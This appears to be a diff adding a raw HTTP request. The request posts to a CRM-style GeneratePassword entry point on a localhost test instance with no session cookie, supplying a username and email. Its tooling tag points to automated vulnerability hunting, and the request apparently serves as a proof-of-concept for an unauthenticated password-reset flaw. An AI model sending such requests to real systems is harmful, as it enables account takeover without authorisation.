@@ -1,0 +1,7 @@
+POST /index.php?entryPoint=GeneratePassword HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Content-Type: application/x-www-form-urlencoded
+# NOTE: no Cookie header -- this request carries NO session/authentication at all
+
+user_name=mod_ebca2b3b&Users0emailAddress0=mod_ebca2b3b%40example.invalid
